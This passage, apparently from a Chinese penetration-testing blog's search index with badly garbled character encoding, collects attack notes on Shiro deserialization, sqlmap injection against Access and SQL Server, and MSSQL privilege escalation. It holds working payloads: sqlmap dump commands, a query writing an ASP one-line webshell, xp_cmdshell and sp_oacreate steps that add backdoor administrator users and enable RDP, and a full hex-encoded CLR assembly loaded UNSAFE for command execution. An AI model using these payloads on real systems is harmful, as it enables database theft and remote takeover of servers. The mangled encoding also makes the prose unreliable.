ä¸ºé»˜è®¤çš„comparatoræ˜¯éœ€è¦æœ‰ccä¾èµ–çš„ä½¿ç”¨ysoserialæ‰“çš„æ—¶å€™ï¼Œè¦æ³¨æ„ç‰ˆæœ¬ï¼Œysoçš„cbç‰ˆæœ¬æ˜¯1.9.2","link":"/2023/01/15/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"title":"sqlmapæŒ‡ä»¤","text":"##accessæ•°æ®åº“+sqlmapæŒ‡ä»¤###getç±»å‹æ³¨å…¥1.æ£€æµ‹æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼š'ã€and 1=1ã€and 1=2ã€2.ä½¿ç”¨sqlmapè¿›è¡Œæ£€æµ‹æ³¨å…¥ç‚¹æ˜¯å¦å¯ç”¨ sqlmap.py -u url 3.å®Œæ•´çš„access+sqlmapæ³¨å…¥æŒ‡ä»¤ ä¸€ä¸ªå®Œæ•´çš„accessæ³¨å…¥è¿‡ç¨‹å‘½ä»¤ï¼ˆ1ï¼‰æ³¨å…¥ç‚¹åˆ¤æ–­ï¼šsqlmap.py-u http://www.antian365.com/index.asp?id=1ï¼ˆ2ï¼‰çŒœæ•°æ®åº“è¡¨:sqlmap.py -u http://www.antian365.com/index.asp?id=1 â€“tablesè¾“å…¥çº¿ç¨‹ï¼š10ï¼Œå›è½¦åå¼€å§‹è·‘è¡¨ï¼Œæ‰¾åˆ°åˆé€‚çš„è¡¨åï¼ŒæŒ‰ä¸‹ctrl+cç»ˆæ­¢è·‘è¡¨ã€‚ï¼ˆ3ï¼‰å¯¹æŸä¸ªè¡¨è¿›è¡Œå­—æ®µçŒœè§£sqlmap.py-u â€ http://www.antian365.com/index.asp?id=1â€ â€“tables â€“columns -Tadminä¾‹å¦‚è·å–adminè¡¨çš„å­—æ®µå¦‚ä¸‹ï¼š id,username,passwordï¼ˆ4ï¼‰å¯¹adminè¡¨å­—æ®µå†…å®¹è¿›è¡ŒçŒœè§£sqlmap.py -u &quot; http://www.antian365.com/index.asp?id=1&quot;--dump -T admin -C &quot;username,password&quot; ï¼ˆ5ï¼‰è·å–æ˜æ–‡å¯†ç æˆ–è€…åŠ å¯†å¯†ç ã€‚é€šè¿‡cmd5.comç­‰åœ¨çº¿ç½‘ç«™è¿›è¡Œæ˜æ–‡å¯†ç ç ´è§£ã€‚ï¼ˆ6ï¼‰å¯»æ‰¾åå°åœ°å€ï¼Œå¹¶ç™»å½•åå°ï¼ˆ7ï¼‰é€šè¿‡åå°ç®¡ç†å¯»æ±‚å¯ä»¥è·å–webshellçš„åŠŸèƒ½æ¨¡å—ï¼Œå°è¯•è·å–webshellã€‚çŸ¥é“webçœŸå®è·¯å¾„ï¼Œä¸”å¯ä»¥é€šè¿‡è„šæœ¬æ‰§è¡ŒæŸ¥è¯¢ï¼Œåˆ™å¯ä»¥é€šè¿‡æŸ¥è¯¢æ¥è·å–webshellï¼Œä¾‹å¦‚ç½‘ç«™çœŸå®è·¯å¾„ï¼šd:\\freehost\\fred200903\\web\\ï¼Œåˆ™æŸ¥è¯¢è¯­å¥ä¸ºï¼šSELECT '&lt;%execute request(&quot;a&quot;)%&gt;' into [a] in ' d:\\freehost\\fred200903\\web\\x.asp;a.xls''excel 8.0;' from aShellåœ°å€ï¼šhttp://www.somesite.com/ x.asp;a.xlsï¼Œä¸€å¥è¯åé—¨å¯†ç aã€‚ ###POSTç±»å‹æ³¨å…¥ï¼š 1.Accesspostç™»å½•æ¡†æ³¨å…¥æ³¨å…¥ç‚¹ï¼šhttp://xxx.xxx.com/Login.aspï¼ˆ1ï¼‰é€šè¿‡burpsurteæŠ“åŒ…ä¿å­˜ä¸ºtxtæ–‡ä»¶ï¼Œä½¿ç”¨sqlmapè¿›è¡Œè‡ªåŠ¨æ³¨å…¥ä¾‹å¦‚å¯¹ç€æ³¨å…¥ç‚¹ä½¿ç”¨burpæŠ“åŒ…ï¼Œä¿å­˜tg .txtæ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤ï¼š./sqlmap.py-r tg.txt -p tfUPassï¼ˆ2ï¼‰è‡ªåŠ¨æœç´¢è¡¨å•çš„æ–¹å¼ sqlmap-u http://xxx.xxx.com/Login.asp â€“formsï¼ˆ3ï¼‰æŒ‡å®šä¸€ä¸ªå‚æ•°çš„æ–¹æ³•sqlmap-u http://xxx.xxx.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot;2.Cookieæ³¨å…¥sqlmap -u &quot;http://www.xxx.com/news.asp&quot;--cookie &quot;id=1&quot; --table --level 2 1.sqlmap -r test.txtåˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œtest.txtä¸­å¯¹æ³¨å…¥ç‚¹è®°å¾—åŠ ä¸ª*å·æ¥åšä¸€ä¸‹æ ‡è®°2.","link":"/2022/05/01/sqlmap%E6%8C%87%E4%BB%A4/"},{"title":"sql_serveræ³¨å…¥","text":"##mssqlæ³¨å…¥SQL Serverçš„ç«¯å£å·æ˜¯1433ï¼Œæ•°æ®åº“åç¼€åæ˜¯.mdfï¼Œæ³¨é‡Šç¬¦æ˜¯â€“ã€‚å»¶æ—¶å‘½ä»¤ï¼šWAITFOR DELAY '0:0:2'###SQLServeræœ‰ä¸‰ä¸ªæƒé™çº§åˆ« saæƒé™ï¼šæ•°æ®åº“æ“ä½œã€æ–‡ä»¶ç®¡ç†ã€å‘½ä»¤æ‰§è¡Œã€æ³¨å†Œè¡¨è¯»å–ç­‰systemã€‚æ˜¯æœ€é«˜æƒé™ dbæƒé™ï¼šæ–‡ä»¶ç®¡ç†ã€æ•°æ®åº“æ“ä½œç­‰æƒé™ publicæƒé™ï¼šæ•°æ®åº“æ“ä½œguest-users ###åˆ¤æ–­å½“å‰ç”¨æˆ·æƒé™ åˆ¤æ–­æ˜¯å¦ä¸ºSAæƒé™select is_srvrolemember('sysadmin')åˆ¤æ–­æ˜¯å¦ä¸ºdb_owneræƒé™select is_member('db_owner')åˆ¤æ–­æ˜¯å¦ä¸ºpublicæƒé™select is_srvrolemember() masteræ•°æ®åº“ï¼šmasteræ•°æ®åº“æ§åˆ¶SQL Serverçš„æ‰€æœ‰æ–¹é¢ã€‚è¿™ä¸ªæ•°æ®åº“ä¸­åŒ…æ‹¬æ‰€æœ‰çš„é…ç½®ä¿¡æ¯ã€ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€å½“å‰æ­£åœ¨æœåŠ¡å™¨ä¸­è¿è¡Œçš„è¿‡ç¨‹çš„ä¿¡æ¯ã€‚ modelæ•°æ®åº“ï¼š modelæ•°æ®åº“æ˜¯å»ºç«‹æ‰€æœ‰ç”¨æˆ·æ•°æ®åº“æ—¶çš„æ¨¡æ¿ã€‚å½“ä½ å»ºç«‹ä¸€ä¸ªæ–°æ•°æ®åº“æ—¶ï¼ŒSQL Serverä¼šæŠŠmodelæ•°æ®åº“ä¸­çš„æ‰€æœ‰å¯¹è±¡å»ºç«‹ä¸€ä»½æ‹·è´å¹¶ç§»åˆ°æ–°æ•°æ®åº“ä¸­ã€‚åœ¨æ¨¡æ¿å¯¹è±¡è¢«æ‹·è´åˆ°æ–°çš„ç”¨æˆ·æ•°æ®åº“ä¸­ä¹‹åï¼Œè¯¥æ•°æ®åº“çš„æ‰€æœ‰å¤šä½™ç©ºé—´éƒ½å°†è¢«ç©ºé¡µå¡«æ»¡ã€‚ msdbæ•°æ®åº“ï¼šmsdbæ•°æ®åº“æ˜¯SQL Serverä¸­çš„ä¸€ä¸ªç‰¹ä¾‹ã€‚å¦‚æœä½ æŸ¥çœ‹è¿™ä¸ªæ•°æ®åº“çš„å®é™…å®šä¹‰ï¼Œä¼šå‘ç°å®ƒå…¶å®æ˜¯ä¸€ä¸ªç”¨æˆ·æ•°æ®åº“ã€‚ä¸åŒä¹‹å¤„æ˜¯SQL Serveræ‹¿è¿™ä¸ªæ•°æ®åº“æ¥åšä»€ä¹ˆã€‚æ‰€æœ‰çš„ä»»åŠ¡è°ƒåº¦ã€æŠ¥è­¦ã€æ“ä½œå‘˜éƒ½å­˜å‚¨åœ¨msdbæ•°æ®åº“ä¸­ã€‚è¯¥åº“çš„å¦ä¸€ä¸ªåŠŸèƒ½æ˜¯ç”¨æ¥å­˜å‚¨æ‰€æœ‰å¤‡ä»½å†å²ã€‚SQL Server Agentå°†ä¼šä½¿ç”¨è¿™ä¸ªåº“ã€‚ tempdbæ•°æ®åº“ï¼štempdbæ•°æ®åº“æ˜¯ä¸€ä¸ªéå¸¸ç‰¹æ®Šçš„æ•°æ®åº“ï¼Œä¾›æ‰€æœ‰æ¥è®¿é—®ä½ çš„SQL Serverçš„ç”¨æˆ·ä½¿ç”¨ã€‚è¿™ä¸ªåº“ç”¨æ¥ä¿å­˜æ‰€æœ‰çš„ä¸´æ—¶è¡¨ã€å­˜å‚¨è¿‡ç¨‹å’Œå…¶ä»–SQL Serverå»ºç«‹çš„ä¸´æ—¶ç”¨çš„ä¸œè¥¿ã€‚ä¾‹å¦‚ï¼Œæ’åºæ—¶è¦ç”¨åˆ°tempdbæ•°æ®åº“ã€‚æ•°æ®è¢«æ”¾è¿›tempdbæ•°æ®åº“ï¼Œæ’å®Œåºåå†æŠŠç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚æ¯æ¬¡SQL Serveré‡æ–°å¯åŠ¨ï¼Œå®ƒéƒ½ä¼šæ¸…ç©ºtempdbæ•°æ®åº“å¹¶é‡å»ºã€‚æ°¸è¿œä¸è¦åœ¨tempdbæ•°æ®åº“å»ºç«‹éœ€è¦æ°¸ä¹…ä¿å­˜çš„è¡¨ã€‚###SQL Serveræ•°æ®åº“çš„æŸ¥è¯¢è¯­å¥ select @@version; #æŸ¥è¯¢æ•°æ®åº“çš„ç‰ˆæœ¬select @@servername; #æŸ¥è¯¢æœåŠ¡åselect host_name(); #æŸ¥è¯¢ä¸»æœºåï¼Œå¦‚æœæ˜¯ç”¨navicatè¿œç¨‹è¿æ¥çš„è¯ï¼Œä¸»æœºåæ˜¯æœ¬åœ°çš„åå­—select db_name(); #æŸ¥è¯¢å½“å‰æ•°æ®åº“åselect db_name(1); #æŸ¥è¯¢ç¬¬ä¸€ä¸ªæ•°æ®åº“åselect db_name(2); #æŸ¥è¯¢ç¬¬äºŒä¸ªæ•°æ®åº“åselect user; #æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„æ‹¥æœ‰è€…ï¼Œç»“æœä¸º dboã€‚dboæ˜¯æ¯ä¸ªæ•°æ®åº“çš„é»˜è®¤ç”¨æˆ·ï¼Œå…·æœ‰æ‰€æœ‰è€…æƒé™ï¼Œå…¨ç§°ï¼šdatebaseOwner ï¼Œå³DbOwner use tempdb #åˆ‡æ¢åˆ°tempdbè¡¨ top n #æŸ¥è¯¢å‰næ¡è®°å½•limit 2,3 #æŸ¥è¯¢ç¬¬2æ¡å¼€å§‹çš„3æ¡æ•°æ®ï¼Œä¹Ÿå°±æ˜¯2,3,4select substring('string',2,1) #æˆªå–ç»™å®šå­—ç¬¦ä¸²çš„ç´¢å¼•ä¸º2çš„1ä¸ªå­—ç¬¦select ascii('a') #æŸ¥è¯¢ç»™å®šå­—ç¬¦ä¸²çš„asciiå€¼select len('string') #æŸ¥è¯¢ç»™å®šå­—ç¬¦ä¸²çš„é•¿åº¦EXEC sp_spaceused @updateusage = N'TRUE'; #æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„å¤§å°sp_spaceused 'è¡¨å' #æŸ¥è¯¢æŒ‡å®šè¡¨åçš„å¤§å°EXEC master.sys.xp_dirtree '\\\\192.168.106.5\\xx.txt',0,1; åˆ¤æ–­æ˜¯å¦æ˜¯SAæƒé™select is_srvrolemember('sysadmin') åˆ¤æ–­æ˜¯å¦æ˜¯db_owneræƒé™ select is_member('db_owner')åˆ¤æ–­æ˜¯å¦æ˜¯publicæƒé™select is_srvrolemember('public') #æ•°æ®åº“çš„è¿æ¥server=127.0.0.1;UID=sa;PWD=123456;database=master;Provider=SQLOLEDBmssql://sa:123456@127.0.0.1/XCCMS_SocialBusinessDB count(name)æ˜¯æŸ¥è¯¢æ€»æ•°nameæ˜¯æŸ¥è¯¢åå­—*æ˜¯æŸ¥è¯¢è¯¦ç»†ä¿¡æ¯ #æŸ¥è¯¢æ•°æ®åº“select count(name) from sysdatabases #æŸ¥è¯¢æ•°æ®åº“çš„ä¸ªæ•°,åªæœ‰å½“å‰æ•°æ®åº“æ˜¯masterçš„æ—¶å€™ï¼Œæ‰èƒ½æ‰§è¡Œè¯¥å‘½ä»¤select name from sysdatabases #æŸ¥è¯¢æ•°æ®åº“çš„åå­—select * from sysdatabases #æŸ¥è¯¢æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ #æŸ¥è¯¢æ•°æ®è¡¨select count(name) from sysobjects where type='U' #æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­è¡¨çš„ä¸ªæ•°select name from sysobjects where type='U' #æŸ¥è¯¢å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨çš„åå­—select * from sysobjects where type='U' #æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„æ‰€æœ‰è¡¨çš„è¯¦ç»†ä¿¡æ¯ select count(name) from test..sysobjects where xtype='U' #æŸ¥è¯¢æŒ‡å®štestæ•°æ®åº“ä¸­è¡¨çš„ä¸ªæ•°select name from test..sysobjects where xtype='U' #æŸ¥è¯¢æŒ‡å®štestæ•°æ®åº“ä¸­è¡¨çš„åå­—select * from test..sysobjects where xtype='U' #æŸ¥è¯¢æŒ‡å®štestæ•°æ®åº“ä¸­è¡¨çš„è¯¦ç»†ä¿¡æ¯ #æŸ¥è¯¢åˆ—select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„æŒ‡å®šusersè¡¨çš„åˆ—çš„ä¸ªæ•°select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„æŒ‡å®šusersè¡¨çš„æ‰€æœ‰åˆ—çš„åå­—select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„æŒ‡å®šusersè¡¨çš„åˆ—çš„è¯¦ç»†ä¿¡æ¯ select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #æŸ¥è¯¢æŒ‡å®štestæ•°æ®åº“çš„æŒ‡å®šusersè¡¨çš„åˆ—çš„ä¸ªæ•°select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #æŸ¥è¯¢æŒ‡å®štestæ•°æ®åº“çš„æŒ‡å®šusersè¡¨çš„æ‰€æœ‰åˆ—çš„åå­—select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #æŸ¥è¯¢æŒ‡å®štestæ•°æ®åº“çš„æŒ‡å®šusersè¡¨çš„åˆ—çš„è¯¦ç»†ä¿¡æ¯ #æŸ¥è¯¢æ•°æ®select count(*) from test..users #æŸ¥è¯¢testæ•°æ®åº“userè¡¨çš„æ•°æ®çš„æ¡æ•°select * from test..users #æŸ¥è¯¢testæ•°æ®åº“userè¡¨çš„æ‰€æœ‰æ•°æ® ###SAæƒé™å¼€å¯xp_cmdshellè·å–ä¸»æœºæƒé™åˆ¤æ–­xp_cmdshellæ˜¯å¦æ‰“å¼€ï¼Œ1å°±æ˜¯æ‰“å¼€ï¼Œ0å°±æ˜¯å…³é—­ select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell' å¦‚æœxp_cmdshellæƒé™æ²¡å¼€å¯çš„è¯ï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢å‘½ä»¤å¼€å¯ execute('sp_configure &quot;show advanced options&quot;,1') #å°†è¯¥é€‰é¡¹çš„å€¼è®¾ç½®ä¸º1execute('reconfigure') #ä¿å­˜è®¾ç½®execute('sp_configure &quot;xp_cmdshell&quot;, 1') #å°†xp_cmdshellçš„å€¼è®¾ç½®ä¸º1execute('reconfigure') #ä¿å­˜è®¾ç½®execute('sp_configure') #æŸ¥çœ‹é…ç½®execute('xp_cmdshell &quot;whoami&quot;') #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ æˆ–è€…exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; exec sp_configure; exec xp_cmdshell 'whoami'; å¯ä»¥æ‰§è¡Œç³»ç»Ÿæƒé™ä¹‹å,å‰ææ˜¯è·å–çš„ä¸»æœºæƒé™æ˜¯administratorsç»„é‡Œçš„exec xp_cmdshell 'net user Guest 123456' #ç»™guestç”¨æˆ·è®¾ç½®å¯†ç exec xp_cmdshell 'net user Guest /active:yes' #æ¿€æ´»guestç”¨æˆ·exec xp_cmdshell 'net localgroup administrators Guest /add' #å°†guestç”¨æˆ·æ·»åŠ åˆ°administratorsç”¨æˆ·ç»„exec xp_cmdshell 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' #å¼€å¯3389ç«¯å£ ###SAæƒé™ä½¿ç”¨sp_oacreateæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ ä½¿ç”¨sp_oacreateææƒå‰ææ¡ä»¶ï¼š SQLServeræ•°æ®åº“æœåŠ¡æœªé™æƒï¼ˆå› ä¸ºéœ€è¦è°ƒç”¨COMç»„ä»¶ï¼‰ 1.æŸ¥çœ‹æ˜¯å¦å¯ä»¥åˆ©ç”¨sp_oacreateæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'whoami' å¦‚æœSQLServeré˜»æ­¢äº†å¯¹ç»„ä»¶â€˜Ole Automation Proceduresâ€™ çš„è¿‡ç¨‹ â€˜sys.sp_OACreateâ€™ çš„è®¿é—®ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ‰“å¼€ EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯sp_oacreateæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ä¸å›æ˜¾å¯ä»¥ä½¿ç”¨æŒ‡ä»¤åˆ›å»ºç”¨æˆ· declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net user hack Password@ /add' **æ³¨:**åˆ›å»ºç”¨æˆ·ä»¥åå¯ä»¥ä½¿ç”¨mstscï¼Œè¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥ä¸Šè¿°å‘½ä»¤å®ç°çš„æ˜¯åˆ›å»ºäº†ä¸€ä¸ªç”¨ç”¨æˆ·åä¸ºhackï¼Œå¯†ç ä¸ºPassword@çš„###SAæƒé™ä½¿ç”¨CLRæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ #å¯ç”¨MSSQL CLRåŠŸèƒ½exec sp_configure 'show advanced options', 1;RECONFIGURE;Exec sp_configure 'clr enabled', 1;RECONFIGURE; #ä¸ºäº†å¯¼å…¥äº†ä¸å®‰å…¨çš„ç¨‹åºé›†ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†æ•°æ®åº“æ ‡è®°ä¸ºå®‰å…¨ã€‚ALTER DATABASE [master] SET TRUSTWORTHY ON; #å¯¼å…¥ç¨‹åºé›†ï¼Œå•ç‹¬æ‰§è¡ŒCREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc020000010053007400720069006e006700460069006c00650049006e0066006f0000009802000001003000300030003000300034006200300000001a000100010043006f006d006d0065006e007400730000000000000022000100010043006f006d00700061006e0079004e0061006d00650000000000000000004a0011000100460069006c0065004400650073006300720069007000740069006f006e0000000000570061007200530051004c004b00690074004d0069006e0069006d0061006c0000000000300008000100460069006c006500560065007200730069006f006e000000000031002e0030002e0030002e00300000004a001500010049006e007400650072006e0061006c004e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c00000000005400180001004c006500670061006c0043006f007000790072006900670068007400000068007400740070003a002f002f006500790075007000630065006c0069006b002e0063006f006d002e007400720000002a00010001004c006500670061006c00540072006100640065006d00610072006b00730000000000000000005200150001004f0072006900670069006e0061006c00460069006c0065006e0061006d0065000000570061007200530051004c004b00690074004d0069006e0069006d0061006c002e0064006c006c000000000036000b000100500072006f0064007500630074004e0061006d0065000000000045007900750070002000430045004c0049004b0000000000340008000100500072006f006400750063007400560065007200730069006f006e00000031002e0030002e0030002e003000000038000800010041007300730065006d0062006c0079002000560065007200730069006f006e00000031002e0030002e0030002e003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000c000000043d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;#åˆ›å»ºå­˜å‚¨è¿‡ç¨‹,å•ç‹¬æ‰§è¡ŒCREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec;#æ‰§è¡Œå‘½ä»¤EXEC sp_cmdExec 'whoami';#åˆ é™¤è¯¥ç¨‹åºé›†DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit]; ###DB_owneræƒé™LOGå¤‡ä»½Getshellæ— 